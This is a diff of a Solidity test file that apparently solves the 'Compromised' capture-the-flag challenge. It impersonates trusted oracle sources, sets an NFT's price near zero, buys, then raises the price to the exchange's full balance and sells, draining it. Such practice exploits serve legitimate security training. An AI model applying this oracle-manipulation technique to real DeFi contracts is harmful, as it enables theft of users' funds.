@@ -18,12 +18,24 @@ contract Compromised is Test {
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
 
+    address trusted_0;
+    address trusted_1;
+    address trusted_2;
+
     function setUp() public {
         address[] memory sources = new address[](3);
 
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
         sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
+
+        trusted_0 = sources[0];
+        trusted_1 = sources[1];
+        trusted_2 = sources[2];
+
+        vm.label(trusted_0, "trusted_0");
+        vm.label(trusted_1, "trusted_1");
+        vm.label(trusted_2, "trusted_2");
 
         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.deal(attacker, 0.1 ether);
@@ -76,6 +88,24 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        //string memory symbol = "DVNFT";
+        uint256 tId;
+
+        //vm.prank(trusted_0);
+        //trustfulOracle.postPrice(exchange.token().symbol(), 0.001 ether);
+        vm.prank(trusted_1);
+        trustfulOracle.postPrice(exchange.token().symbol(), 0.001 ether);
+
+        vm.prank(attacker);
+        tId = exchange.buyOne{value: 0.001 ether}();
+
+        vm.prank(trusted_0);
+        trustfulOracle.postPrice(exchange.token().symbol(), address(exchange).balance);
+        vm.prank(trusted_1);
+        trustfulOracle.postPrice(exchange.token().symbol(), address(exchange).balance);
+
+        vm.prank(attacker);
+        exchange.sellOne(tId);
 
         /**
          * EXPLOIT END *
